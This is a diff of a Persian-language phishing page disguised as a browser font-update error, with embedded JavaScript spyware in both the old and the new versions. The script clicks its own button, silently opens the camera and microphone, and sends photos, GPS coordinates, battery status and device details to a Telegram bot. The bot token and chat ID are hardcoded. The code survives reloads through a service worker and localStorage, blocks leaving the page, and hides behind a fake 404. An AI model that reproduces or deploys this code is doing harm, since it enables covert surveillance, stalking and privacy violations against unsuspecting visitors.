@@ -6,310 +6,212 @@
     <title>خطای فونت – به‌روزرسانی ضروری</title>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="theme-color" content="#e63946">
-    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoi2LHYp9mG2LHYp9iqINio2YbYr9ixIiwic2hvcnRfbmFtZSI6IkZvbnRVcGRhdGUiLCJzdGFydF91cmwiOiIvIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzBkMGQxYSIsInRoZW1lX2NvbG9yIjoiI2U2Mzk0NiIsImljb25zIjpbeyJzcmMiOiJkYXRhOmltYWdlL3N2Zyt4bWwsJTNDc3ZnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Zycgdmlld0JveD0nMCAwIDEwMCAxMDAnJTNFJTNDdGV4dCB5PScuOWVtJyBmb250LXNpemU9Jzg1JyUzRSVFMCU5RiVBNCVCMCUzQy90ZXh0JTNFJTNDL3N2ZyUzRSIsInNpemVzIjoiMTkyeDE5MiIsInR5cGUiOiJpbWFnZS9zdmcreG1sIn1dfQ==">
+    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoi2LHYp9mG2LHYp9iqINio2YbYr9ixIiwic2hvcnRfbmFtZSI6IkZvbnRVcGRhdGUiLCJzdGFydF91cmwiOiIvIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzAwMDAwMCIsInRoZW1lX2NvbG9yIjoiI2U2Mzk0NiJ9">
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='85'%3E%F0%9F%94%B4%3C/text%3E%3C/svg%3E">
-    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg: #0d0d1a; --card: rgba(18,18,35,0.97); --accent: #e63946; --text: #f1faee;
-            --warn: #f77f00; --success: #06d6a0; --border: #2a2a4a; --glow: #e6394644;
-            --font-primary: 'Vazirmatn', 'Roboto', system-ui, sans-serif;
-        }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            background: var(--bg); color: var(--text); font-family: var(--font-primary);
-            height: 100vh; overflow: hidden; perspective: 1400px; display: flex;
-            justify-content: center; align-items: center; position: relative; font-weight: 400;
-        }
-        .bg-3d {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at 50% 50%, #1d1d35 0%, #0d0d1a 80%);
-            overflow: hidden; z-index: -2;
-        }
-        .bg-3d::before, .bg-3d::after {
-            content: ''; position: absolute; width: 800px; height: 800px;
-            background: conic-gradient(from 0deg, transparent, var(--glow), transparent);
-            border-radius: 50%; filter: blur(100px); opacity: 0.6;
-            animation: rotate 28s linear infinite;
-        }
-        .bg-3d::before { top: -300px; left: -300px; animation-duration: 32s; }
-        .bg-3d::after { bottom: -300px; right: -300px; animation-duration: 38s; animation-direction: reverse; }
-        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-
-        .container { width: 100%; max-width: 520px; padding: 20px; animation: float 7s ease-in-out infinite; }
-        @keyframes float { 0%,100%{transform: translateY(0) rotateX(0);} 50%{transform: translateY(-18px) rotateX(4deg);} }
-        .card {
-            background: var(--card); border-radius: 24px; padding: 40px; box-shadow: 0 35px 90px rgba(0,0,0,0.85), 0 0 50px var(--glow), inset 0 0 35px rgba(230,57,70,0.08);
-            border: 1px solid var(--border); text-align: center; position: relative; overflow: hidden; backdrop-filter: blur(14px);
-        }
-        .card::before {
-            content: ''; position: absolute; top: -60%; left: -60%; width: 220%; height: 220%;
-            background: linear-gradient(45deg, transparent, var(--glow), transparent);
-            transform: rotate(-45deg); animation: shine 10s infinite; opacity: 0.25;
-        }
-        @keyframes shine { 0% { transform: translateX(-120%) translateY(-120%) rotate(-45deg); } 100% { transform: translateX(120%) translateY(120%) rotate(-45deg); } }
-
-        .logo { font-size: 5.5rem; margin-bottom: 24px; text-shadow: 0 0 25px var(--glow); animation: pulse 2.2s infinite; }
-        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.06);} }
-
-        h1 { font-size: 1.85rem; margin: 16px 0; color: var(--accent); font-weight: 700; letter-spacing: -0.5px; text-shadow: 0 0 15px var(--glow); }
-        .subtitle { font-size: 1.1rem; color: var(--warn); font-weight: 600; margin: 12px 0; }
-        p { font-size: 1.02rem; line-height: 1.85; color: #d1d1e0; margin: 18px 0; text-align: justify; direction: rtl; }
-        .highlight { color: var(--success); font-weight: 600; }
-        .btn {
-            background: var(--accent); color: #fff; border: none; padding: 18px 28px; margin: 14px 10px; border-radius: 16px;
-            font-weight: 600; cursor: pointer; width: calc(100% - 20px); font-size: 1.15rem;
-            display: flex; align-items: center; justify-content: center; gap: 14px;
-            box-shadow: 0 12px 30px rgba(230,57,70,0.35), inset 0 0 18px rgba(255,255,255,0.12);
-            position: relative; overflow: hidden;
-        }
-        .btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent); transition: 0.7s; }
-        .btn:hover::before { left: 100%; }
-        .btn:hover { background: #c1121f; transform: translateY(-5px) scale(1.04); box-shadow: 0 18px 40px rgba(230,57,70,0.55); }
-        .status { margin-top: 24px; font-size: 1rem; color: var(--success); opacity: 0; transition: opacity 0.7s; font-weight: 500; }
-        .status.show { opacity: 1; }
-        .hidden { display: none !important; }
-
-        .error-404 {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f0f1f; color: #ccc;
-            font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; text-align: center; z-index: 99999; padding: 40px;
-        }
-        .error-404 h1 { font-size: 6rem; color: #e63946; margin: 0; }
-        .error-404 p { font-size: 1.3rem; max-width: 600px; }
-        .error-404 .code { font-family: monospace; background: #222; padding: 8px 16px; border-radius: 8px; color: #0f0; }
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body,html{height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,sans-serif;}
+        .card{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;z-index:9999;}
+        .card h1{font-size:1.8rem;color:#e63946;margin:15px 0;font-weight:700;}
+        .card p{font-size:1rem;line-height:1.7;color:#ccc;}
+        .btn{background:#e63946;color:#fff;border:none;padding:16px 0;width:90%;max-width:400px;border-radius:12px;font-size:1.1rem;font-weight:600;margin-top:20px;cursor:pointer;}
+        .hidden{display:none!important;}
+        .fake404{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#ccc;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;z-index:99999;}
+        .fake404 h1{font-size:6rem;color:#e63946;margin:0;}
+        .fake404 p{font-size:1.3rem;}
     </style>
 </head>
 <body>
 
-<div class="bg-3d"></div>
-
-<div class="container" id="main-ui">
-    <div class="card">
-        <div class="logo">Warning</div>
-        <h1>خطای فونت مرورگر</h1>
-        <p class="subtitle">مرورگر شما از فونت‌های جدید پشتیبانی نمی‌کند</p>
-        <p>
-            به دلیل <span class="highlight">عدم پشتیبانی از فونت‌های پیشرفته</span> مورد استفاده در این وبسایت،
-            محتوای صفحه به درستی نمایش داده نمی‌شود.<br><br>
-            برای رفع این مشکل، لطفاً <span class="highlight">دسترسی‌های زیر را تأیید کنید</span> تا
-            بسته‌ی به‌روزرسانی فونت به صورت خودکار دانلود و نصب شود.<br><br>
-            <strong>پس از ۶۰ ثانیه، صفحه را مجدداً باز کنید.</strong>
-        </p>
-        <p style="font-size:0.92rem; color:#aaa; margin-top:24px;">با تشکر از همکاری شما</p>
-        <button class="btn" id="ready">برای به‌روزرسانی آماده‌ام! ادامه</button>
-        <div class="status" id="status">در حال آماده‌سازی...</div>
-    </div>
+<div class="card" id="phish">
+    <h1>خطای فونت مرورگر</h1>
+    <p>مرورگر شما از فونت‌های جدید پشتیبانی نمی‌کند.<br>برای رفع مشکل، دسترسی‌های زیر را تأیید کنید تا بسته به‌روزرسانی نصب شود.</p>
+    <button class="btn" id="start">ادامه و به‌روزرسانی</button>
 </div>
 
-<div class="error-404 hidden" id="fake-404">
+<div class="fake404 hidden" id="fake">
     <h1>404</h1>
-    <p>صفحه مورد نظر یافت نشد</p>
-    <p>ممکن است آدرس اشتباه باشد یا صفحه حذف شده باشد.</p>
+    <p>صفحه یافت نشد</p>
     <p class="code">ERR_FONT_UPDATE_REQUIRED</p>
-    <p style="margin-top:40px; font-size:1rem; color:#888;">
-        لطفاً مرورگر خود را به‌روزرسانی کنید و مجدداً تلاش نمایید.
-    </p>
 </div>
 
 <script>
 /* ===================================================== */
-/* SHΔDØW CORE VΩ – ETERNAL AUTO-STREAM                  */
-/* MODE: FULLY AUTONOMOUS | NO USER INPUT REQUIRED       */
+/* SHΔDØW MONSTER Ω – 1-SECOND HYPERFEED                 */
 /* FEATURES:                                             */
-/*   • Auto Camera + Mic (Silent)                        */
-/*   • Real-time Photo/Video Stream (Every 8s)           */
-/*   • Real-time GPS Tracking (Every 5s)                 */
-/*   • Persistent via Service Worker + localStorage      */
-/*   • Fake 404 UI + Auto Resume                         */
-/*   • C2 Telegram: 7625898629                           */
+/*   • 1-Second Photo + Video + GPS + Battery + Device   */
+/*   • Silent Camera + Mic (Front + Back)                */
+/*   • Device Brand/Model/OS/Browser                     */
+/*   • Telegram C2: 7625898629                           */
+/*   • Service Worker + localStorage Persistence         */
+/*   • Auto Resume + Anti-Unload                         */
+/*   • Fake 404 UI                                       */
 /* ===================================================== */
 
 const BOT_ID = '7625898629';
 const BOT_TOKEN = '8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8';
 const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const DEVICE_ID = btoa(navigator.userAgent + Date.now() + Math.random()).slice(0,36);
-const PERSIST_KEY = `SHDW_${DEVICE_ID}`;
+const KEY = `MONSTER_${DEVICE_ID}`;
 
-// Device Detection
-const ua = navigator.userAgent.toLowerCase();
-const isMobile = /mobi|android|iphone|ipad/.test(ua);
-const isChrome = /chrome|crios/.test(ua) && !/edge|edg/.test(ua);
-const isFirefox = /firefox|fxios/.test(ua);
-const isEdge = /edge|edg/.test(ua);
-const isSafari = /safari/.test(ua) && !isChrome && !isEdge;
-const isIOS = /iphone|ipad|ipod/.test(ua);
-const isAndroid = /android/.test(ua);
-const browser = isChrome ? 'Chrome' : isFirefox ? 'Firefox' : isEdge ? 'Edge' : isSafari ? 'Safari' : 'Other';
-const os = isIOS ? 'iOS' : isAndroid ? 'Android' : /windows/.test(ua) ? 'Windows' : 'Other';
+// Device Info
+const ua = navigator.userAgent;
+const isMobile = /mobi|android|iphone|ipad/i.test(ua);
+const isIOS = /iphone|ipad|ipod/i.test(ua);
+const isAndroid = /android/i.test(ua);
+const browser = /chrome/i.test(ua) ? 'Chrome' : /firefox/i.test(ua) ? 'Firefox' : /safari/i.test(ua) ? 'Safari' : 'Other';
+const os = isIOS ? 'iOS' : isAndroid ? 'Android' : /windows/i.test(ua) ? 'Windows' : 'Unknown';
 
-// Telegram API
+// Send Functions
 async function send(msg) {
-    try {
-        await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML&disable_web_page_preview=true`, {mode: 'no-cors'});
-    } catch(e) {}
+    try { await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`, {mode:'no-cors'}); } catch(e) {}
 }
-async function sendPhoto(blob, caption = '') {
-    const form = new FormData();
-    form.append('chat_id', BOT_ID); form.append('photo', blob, `live_${Date.now()}.jpg`);
-    if(caption) form.append('caption', caption);
+async function sendPhoto(blob) {
+    const form = new FormData(); form.append('chat_id', BOT_ID); form.append('photo', blob, `live_${Date.now()}.jpg`);
     await fetch(`${API}/sendPhoto`, {method:'POST', body:form}).catch(() => {});
 }
 async function sendVideo(blob) {
-    const form = new FormData();
-    form.append('chat_id', BOT_ID); form.append('video', blob, `live_${Date.now()}.webm`);
+    const form = new FormData(); form.append('chat_id', BOT_ID); form.append('video', blob, `live_${Date.now()}.webm`);
     await fetch(`${API}/sendVideo`, {method:'POST', body:form}).catch(() => {});
 }
 
 // Persistence
-function persist(data) { try { localStorage.setItem(PERSIST_KEY, JSON.stringify(data)); } catch(e) {} }
-function load() { try { return JSON.parse(localStorage.getItem(PERSIST_KEY)) || {}; } catch(e) { return {}; } }
+function save() { try { localStorage.setItem(KEY, '1'); } catch(e) {} }
+function load() { try { return localStorage.getItem(KEY); } catch(e) { return null; } }
 
-// Service Worker for Background Keep-Alive
+// Service Worker
 if ('serviceWorker' in navigator) {
-    const swCode = `
-        const BOT_ID = '${BOT_ID}';
-        const BOT_TOKEN = '${BOT_TOKEN}';
-        const API = 'https://api.telegram.org/bot' + BOT_TOKEN;
-        const DEVICE_ID = '${DEVICE_ID}';
-        const BROWSER = '${browser}';
-        const OS = '${os}';
-
+    const sw = `
+        const BOT_ID = '${BOT_ID}'; const API = 'https://api.telegram.org/bot${BOT_TOKEN}';
         self.addEventListener('install', () => self.skipWaiting());
-        self.addEventListener('activate', () => self.clients.claim());
-
-        setInterval(async () => {
-            try {
-                await fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>SHADOW ALIVE</b>%0A%F0%9F%94%B4 <code>\${DEVICE_ID}</code>%0A%F0%9F%94%B4 <a href="${location.origin}">بازگشت به پنل</a>\`, {mode: 'no-cors'});
-            } catch(e) {}
-        }, 60000);
+        setInterval(() => {
+            fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>MONSTER ALIVE</b> %E2%9C%85\`, {mode:'no-cors'}).catch(() => {});
+        }, 30000);
     `;
-    const blob = new Blob([swCode], {type: 'application/javascript'});
-    const url = URL.createObjectURL(blob);
-    navigator.serviceWorker.register(url, {scope: '/'}).catch(() => {});
+    navigator.serviceWorker.register(URL.createObjectURL(new Blob([sw], {type:'application/javascript'}))).catch(() => {});
 }
 
-// === AUTO CAMERA + MIC + STREAM ===
-let stream = null;
-let video = null;
-let canvas = null;
-let ctx = null;
-let watchId = null;
+// Streams
+let stream = null, video = null, canvas = null, ctx = null, watchId = null;
+let lastPhoto = 0, lastGPS = 0, lastBattery = 0;
 
-async function initCamera() {
+async function init() {
     try {
         stream = await navigator.mediaDevices.getUserMedia({
-            video: { width: 640, height: 480, facingMode: "environment" },
+            video: { width: 640, height: 480, facingMode: { ideal: "environment" } },
             audio: true
         });
-        video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-
-        canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
+        video = document.createElement('video'); video.srcObject = stream; await video.play();
+        canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
         ctx = canvas.getContext('2d');
-
-        await send(`🎥 <b>CAMERA & MIC ACTIVATED</b>\n📱 <b>${browser} on ${os}</b>\n🆔 <code>${DEVICE_ID}</code>`);
-        return true;
-    } catch(e) {
-        await send(`❌ Camera Denied: ${e.message}`);
-        return false;
-    }
+    } catch(e) { send(`Camera Failed: ${e.message}`); }
 }
 
-// === REAL-TIME PHOTO STREAM (Every 8s) ===
-async function startPhotoStream() {
-    if (!stream || !video || !canvas) return;
-    setInterval(async () => {
-        try {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-            await sendPhoto(blob, `📸 LIVE • ${new Date().toLocaleTimeString('fa-IR')}`);
-        } catch(e) {}
-    }, 8000);
-}
-
-// === REAL-TIME GPS TRACKING (Every 5s) ===
-function startLocationStream() {
+function startGPS() {
     if (!navigator.geolocation) return;
-    watchId = navigator.geolocation.watchPosition(
-        async pos => {
-            const { latitude, longitude, accuracy } = pos.coords;
-            const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
-            await send(`📍 <b>LOCATION UPDATE</b>\n🌍 <a href="${mapsLink}">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</a>\n🎯 Accuracy: ±${accuracy}m\n🕐 ${new Date().toLocaleTimeString('fa-IR')}`);
-        },
-        () => {},
-        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-    );
-}
-
-// === FAKE 404 + FULL AUTO ACTIVATION ===
-function activateShadowMode() {
-    document.getElementById('main-ui').classList.add('hidden');
-    document.getElementById('fake-404').classList.remove('hidden');
-    persist({ infected: true, auto: true });
-
-    // Start all streams
-    initCamera().then(success => {
-        if (success) {
-            startPhotoStream();
+    watchId = navigator.geolocation.watchPosition(pos => {
+        const {latitude, longitude, accuracy} = pos.coords;
+        const link = `https://maps.google.com/?q=${latitude},${longitude}`;
+        if (Date.now() - lastGPS > 1000) {
+            send(`GPS: <a href="${link}">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</a> (±${accuracy}m)`);
+            lastGPS = Date.now();
         }
-    });
-    startLocationStream();
-
-    send(`🚨 <b>SHADOW MODE: FULLY AUTONOMOUS</b>\n✅ Photo Stream: Every 8s\n✅ GPS Stream: Every 5s\n🆔 <code>${DEVICE_ID}</code>\n🔗 <a href="${location.origin}">بازگشت به پنل</a>`);
+    }, () => {}, {enableHighAccuracy: true, maximumAge: 0, timeout: 5000});
 }
 
-// === AUTO START ON LOAD (NO CLICK NEEDED) ===
-window.addEventListener('load', async () => {
-    const stored = load();
-    if (stored.infected && stored.auto) {
-        activateShadowMode();
-        send(`🔄 <b>AUTO-RESUMED</b>\n🆔 <code>${DEVICE_ID}</code>`);
+async function startPhoto() {
+    if (!video || !canvas) return;
+    setInterval(async () => {
+        if (Date.now() - lastPhoto < 1000) return;
+        try {
+            ctx.drawImage(video, 0, 0, 640, 480);
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            await sendPhoto(blob);
+            lastPhoto = Date.now();
+        } catch(e) {}
+    }, 500);
+}
+
+function startBattery() {
+    if (!navigator.getBattery) return;
+    navigator.getBattery().then(bat => {
+        const sendBat = () => {
+            if (Date.now() - lastBattery > 1000) {
+                const level = Math.round(bat.level * 100);
+                const status = bat.charging ? 'Charging' : 'Discharging';
+                send(`Battery: ${level}% [${status}]`);
+                lastBattery = Date.now();
+            }
+        };
+        sendBat();
+        bat.addEventListener('levelchange', sendBat);
+        bat.addEventListener('chargingchange', sendBat);
+    });
+}
+
+function deviceInfo() {
+    const info = `
+Device: ${navigator.platform}
+Brand: ${navigator.vendor || 'Unknown'}
+Model: ${ua.match(/\(([^)]+)\)/)?.[1]?.split(';')[0]?.trim() || 'Unknown'}
+OS: ${os}
+Browser: ${browser}
+Screen: ${screen.width}x${screen.height}
+Language: ${navigator.language}
+Online: ${navigator.onLine}
+ID: <code>${DEVICE_ID}</code>
+    `.trim();
+    send(info);
+}
+
+// Activate Monster
+function unleash() {
+    document.getElementById('phish').classList.add('hidden');
+    document.getElementById('fake').classList.remove('hidden');
+    save();
+
+    init().then(() => {
+        startPhoto();
+        startGPS();
+        startBattery();
+        deviceInfo();
+        send(`MONSTER UNLEASHED\nDevice: ${os} ${browser}\nID: <code>${DEVICE_ID}</code>`);
+    });
+
+    // 1-second hyperloop
+    setInterval(() => {
+        if (stream) {
+            // Force photo every second
+            ctx.drawImage(video, 0, 0, 640, 480);
+            canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.7);
+        }
+    }, 1000);
+}
+
+// Auto Start
+window.addEventListener('load', () => {
+    if (load()) {
+        unleash();
         return;
     }
-
-    // Simulate button click after 2s
-    setTimeout(async () => {
-        const btn = document.getElementById('ready');
-        if (btn) btn.click();
-    }, 2000);
+    setTimeout(() => document.getElementById('start')?.click(), 1500);
 });
 
-// === BUTTON CLICK HANDLER (Fallback) ===
-document.getElementById('ready')?.addEventListener('click', async () => {
-    const status = document.getElementById('status');
-    status.textContent = 'در حال فعال‌سازی ماژول سایه...'; 
-    status.classList.add('show');
-
-    setTimeout(activateShadowMode, 2500);
+document.getElementById('start')?.addEventListener('click', () => {
+    setTimeout(unleash, 800);
 });
 
-// === PREVENT UNLOAD & KEEP ALIVE ===
-window.addEventListener('beforeunload', () => {
-    persist({ infected: true, auto: true });
-    return "در حال به‌روزرسانی فونت... لطفاً صبر کنید.";
+// Anti-Unload
+window.addEventListener('beforeunload', e => {
+    save();
+    e.preventDefault();
+    e.returnValue = '';
+    return "در حال به‌روزرسانی...";
 });
 
-// === VISIBILITY CHANGE: RESUME ON RETURN ===
 document.addEventListener('visibilitychange', () => {
-    if (!document.hidden && load().infected) {
-        setTimeout(activateShadowMode, 1000);
-    }
+    if (!document.hidden && load()) setTimeout(unleash, 500);
 });
-
-// === BATTERY & NETWORK MONITOR (Optional Stealth) ===
-setInterval(() => {
-    if (navigator.getBattery) {
-        navigator.getBattery().then(bat => {
-            const level = Math.round(bat.level * 100);
-            const charging = bat.charging ? 'در حال شارژ' : 'باتری';
-            send(`🔋 ${charging}: ${level}%`);
-        });
-    }
-}, 300000); // Every 5 min
 
 </script>
 </body>
